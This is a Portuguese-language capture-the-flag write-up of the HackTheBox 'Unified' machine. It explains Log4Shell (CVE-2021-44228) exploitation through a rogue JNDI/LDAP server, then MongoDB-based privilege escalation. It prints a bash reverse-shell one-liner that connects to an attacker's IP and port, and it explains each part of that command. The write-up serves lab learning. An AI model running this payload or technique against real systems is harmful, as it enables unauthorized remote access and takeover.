---
title: HackTheBox Unified
subtitle: Relatório da resolução da máquina Unified do site HackTheBox
tags: [ctf]
date: 05/09/26
---

# HackTheBox: Unified
## Introdução
Esse relatório mostra minha experiência resolvendo essa máquina. Em linhas gerais, os tópicos abordados são *Log4Shell* e MongoDB. As etapas podem ser divididas em mapeamento, pesquisa, *reverse shell* e escalamento.

## Mapeamento
No mapeamento, iniciamos escaneando normalmente o IP dado usando *nmap*. Encontramos 4 portas com serviços abertos. Uma delas tem um servidor HTTP. Essa plataforma, UniFi, é basicamente um software para gerenciamento de rede. A máquina pergunta a versão rodando no momento, que podemos obter ao entrar na porta específica pelo navegador. Na tela de login, além de obtermos a versão, visualizamops uma tela de login e senha.

## Pesquisa
Ao realizar uma busca por esse software na internet, encontramos a vulnerabilidade CVE-2021-44228. O código CVE, que significa *Common Vulnerabilities and Exposures*, é um dicionário público que cataloga diversas vulnerabilidades. Essa em específico refere-se ao *Log4Shell*, uma falha descoberta em 2021 encontrada em aplicações Java. 
Para que possamos entender a vulnerabilidade, precisamos compreender dois conceitos:
- **JNDI**:  (Java Naming and Directory Interface) é uma API padrão da linguagem Java usada para buscar e descobrir dados, objetos ou recursos externos por meio de um nome amigável.
- **LDAP**: (Lightweight Directory Access Protocol) é um protocolo utilizado para localizar e gerenciar arquivos guardados em um serv idor unificado.

## *Reverse Shell*
### Como o *Log4Shell* funciona?
1. **Entrada do dado**: O valor entra na aplicação (ex: no campo de login ou no header User-Agent).

2. **Registro no Log**: A aplicação falha ou processa o login e envia a string para ser gravada em log: logger.info("User: " + username).

3. **Interpolação do Log4j**: O Log4j lê ${jndi:...} e pensa: Preciso resolver essa consulta antes de gravar no arquivo de texto.

4. **Consulta JNDI**: O Log4j aciona o JNDI, que abre uma conexão de rede via LDAP para o servidor do atacante.

5. **Resposta Maliciosa (Rogue JNDI)**: O servidor LDAP do atacante responde ao Log4j fornecendo um gadget ou uma referência para baixar uma classe Java maliciosa.

6. **Execução de Código (RCE)**: O servidor alvo baixa/instancia a classe Java e executa o comando do sistema operacional (whoami, bash -i, etc.) com os mesmos privilégios do serviço Java.

Para subir o servidor LDAP, usamos a ferramenta *rogue-jndi* disponível para download no *Github*. Ela sobe um servidor que entrega classes Java maliciosas para as requisições. No caso, essa classe executa um comando pré-definido pelo atacante.

### Sobre o *ReverseShell*:
Uma Reverse Shell (ou shell reversa) é uma técnica de exploração onde a máquina alvo (o servidor vulnerável) inicia uma conexão de saída (outbound) de volta para a máquina do atacante, fornecendo um terminal interativo de linha de comando.
O comando desejado é:
`bash -i >& /dev/tcp/<SEU_IP>/<PORTA> 0>&1`

- `bash`: Inicia o interpretador de comandos Bourne-Again Shell no Linux do alvo.

- `-i`: Define a execução no modo interativo (interactive). Sem essa flag, o terminal não geraria prompts e não manteria a sessão aberta aguardando novas entradas.

- `>&`: Operador do Bash que redireciona juntos a saída padrão (stdout - descritor 1) e a saída de erro padrão (stderr - descritor 2).

- `/dev/tcp/<SEU_IP>/<PORTA>`: Funcionalidade nativa do Bash. Quando o Bash tenta escrever em caminhos /dev/tcp/IP/PORTA, ele converte esse caminho em um soquete de rede TCP diretamente para o endereço especificado (no caso, a sua máquina na porta 4444).

- `0>&1`: Redireciona a entrada padrão (stdin - descritor 0) para o mesmo destino para onde a saída padrão (1) foi enviada. Isso permite que os comandos digitados no seu terminal do netcat viajem de volta pelo soquete TCP e sejam executados pelo Bash do alvo.

Ao subir um servidor em uma porta qualquer e aplicar uma shell reversa usando o *rogue-jndi*, temos acesso ao servidor alvo.

## Escalamento

Para buscar por processos ativos, usamos o comando `ps aux`. Ele retorna o usuário que o ativou e o comando utilizado. Vasculhando os disponíveis, achamos um MongoDB rodando na máquina. Nele, modificamos a senha do usuário *administrator* para acessar o painel no site e, finalmente, ler a senha do *root*.